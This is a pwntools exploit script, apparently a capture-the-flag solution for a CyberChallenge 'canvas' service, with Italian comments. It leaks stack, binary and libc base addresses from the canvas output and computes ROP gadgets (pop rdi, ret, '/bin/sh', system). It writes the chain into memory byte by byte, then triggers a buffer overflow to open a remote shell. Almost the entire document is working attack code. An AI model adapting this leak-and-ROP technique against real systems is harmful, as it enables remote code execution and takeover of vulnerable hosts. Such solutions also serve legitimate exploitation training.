from pwn import *

HOST, PORT = 'canvas.challs.cyberchallenge.it', 9603
io = remote(HOST, PORT)

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def menu(choice: int):
    """Invia la scelta al menu principale."""
    io.sendlineafter(b'>', str(choice).encode())


def resize(dim: int):
    menu(1)
    io.sendlineafter(b'dimension:', str(dim).encode())


def write_pixel(x: int, y: int, value: int):
    """Scrive un singolo byte (0-255) nel pixel (x, y)."""
    menu(2)
    io.sendlineafter(b'X:', str(x).encode())
    io.sendlineafter(b'Y:', str(y).encode())
    io.sendlineafter(b'):', str(value).encode())


def write_qword(x: int, y: int, qword: int):
    """Scrive 8 byte little-endian partendo dal pixel (x, y)."""
    for i in range(8):
        write_pixel(x + i, y, (qword >> (8 * i)) & 0xFF)


def parse_leak(raw: bytes) -> int:
    """Ricostruisce un indirizzo little-endian da 48 byte di canvas."""
    leak_hex = ''.join(raw[i * 6 - 2 : i * 6].decode() for i in range(7, -1, -1))
    return int(leak_hex, 16)

# ---------------------------------------------------------------------------
# Stage 1: leak degli indirizzi
# ---------------------------------------------------------------------------

resize(32)
menu(3)

io.recvline()
io.recvline()

io.recv(516)

stack_canvas = parse_leak(io.recv(48)) - 0x484
io.recv(48)

bin_base = parse_leak(io.recv(48)) - 0x156E

io.recv(144)

libc_base = parse_leak(io.recv(48)) - 0x24083

log.success(f"canvas stack   {hex(stack_canvas)}")
log.success(f"binary base    {hex(bin_base)}")
log.success(f"libc   base    {hex(libc_base)}")

# ---------------------------------------------------------------------------
# Stage 2: calcolo gadget ROP
# ---------------------------------------------------------------------------

pop_rdi = libc_base + 0x23B6A
ret     = libc_base + 0x22679  # allineamento (libc >= 2.34)
bin_sh  = libc_base + 0x1B45BD
system  = libc_base + 0x52290

# ---------------------------------------------------------------------------
# Stage 3: scrittura ROP chain nel canvas
# ---------------------------------------------------------------------------

resize(60)

write_qword(16, 15, pop_rdi)
write_qword(24, 15, bin_sh)
write_qword(32, 15, ret)
write_qword(40, 15, system)

# ---------------------------------------------------------------------------
# Stage 4: trigger BOF e shell
# ---------------------------------------------------------------------------

menu('*')
io.interactive()